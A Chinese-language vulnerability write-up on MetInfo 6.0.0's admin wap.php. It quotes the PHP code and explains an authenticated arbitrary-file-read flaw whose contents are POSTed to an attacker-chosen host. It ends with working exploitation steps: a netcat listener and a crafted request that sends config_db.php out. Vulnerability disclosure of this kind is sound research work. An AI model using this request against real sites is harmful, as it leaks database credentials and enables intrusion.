分析
----
问题代码如下
MetInfo6.0.0/admin/app/wap/wap.php 1-27行
```php
<?php
$depth='../';
require_once $depth.'../login/login_check.php';
//$action='dimensional';
echo str_replace(array('http',':','/'),$met_wap_url);
if($action == 'dimensional'){
    require_once ROOTPATH.'include/export.func.php';
    $met_file='/dimensional.php';
    //$met_dimensional_logo=$met_weburl.str_replace('../','',$met_dimensional_logo);
    $met_dimensional_logo_file=file_get_contents(ROOTPATH.str_replace('../','',$met_dimensional_logo));//去掉了../，在windows下..\也可以做目录跳转
    //任意文件读取
    $met_dimensional_logo_file=urlencode($met_dimensional_logo_file);
    $met_weburl_mobile = $met_weburl;
    if($met_wap_tpb){
        if($met_langok[$lang][link]){
            $met_weburl_mobile = $met_langok[$lang][link];
        }
        if($met_wap_url)$met_weburl_mobile=$met_wap_url;
    }
    $post=array('text'=>$met_weburl_mobile,'w'=>$wap_dimensional_size,'logo'=>$met_dimensional_logo_file);
    $re=curl_post($post,30);//读取的内容发送给远端
    if(!file_exists('../../../upload/files/'))mkdir('../../../upload/files/');
    file_put_contents('../../../upload/files/dimensional.png',$re);
    require_once $depth.'../include/config.php';
    echo '../../../upload/files/dimensional.png?'.met_rand(4);
    die();
}
```
代码功能就是读取ROOTPATH.str_replace('../','',$met_dimensional_logo)文件的内容，进行url编码，在通过curl_post方法向远程服务器发起post的请求，文件内容就作为post请求的请求体。
$met_dimensional_logo_file 可控

curl_post是在MetInfo6.0.0/include/export.func.php中定义的
```php
function curl_post($post,$timeout){
    global $met_weburl,$met_host,$met_file;
    $host=$met_host;
    $file=$met_file;
    if(get_extension_funcs('curl')&&function_exists('curl_init')&&function_exists('curl_setopt')&&function_exists('curl_exec')&&function_exists('curl_close')){
        $curlHandle=curl_init(); 
        curl_setopt($curlHandle,CURLOPT_URL,'http://'.$host.$file); 
        curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl);
        curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,1); 
        curl_setopt($curlHandle,CURLOPT_CONNECTTIMEOUT,$timeout);
        curl_setopt($curlHandle,CURLOPT_TIMEOUT,$timeout);
        curl_setopt($curlHandle,CURLOPT_POST, 1);   
        curl_setopt($curlHandle,CURLOPT_POSTFIELDS, $post);
        $result=curl_exec($curlHandle); 
        curl_close($curlHandle); 
    }
```
其中$met_weburl,$met_host,$met_file都是可控的。
所以linux下可以利用把web目录下的任意文件内容传给我们可控的远端服务器，windows下可以利用..\目录跳转读取任意文件内容传给我们可控的远端服务器。

利用
----

1.需要能登录后台

2.在本地开启监听 nc -l 8001 ，当然也可以是远程服务器上开启

3.请求http://localhost/metinfo6.0.0/admin/app/wap/wap.php?action=dimensional&met_host=127.0.0.1:8001&met_dimensional_logo=config/config_db.php

4.然后nc就收到了post传过来的MetInfo6.0.0/admin/config/config_db.php文件

![](https://github.com/white-cell/bugs/raw/master/MetInfo/nc.jpg)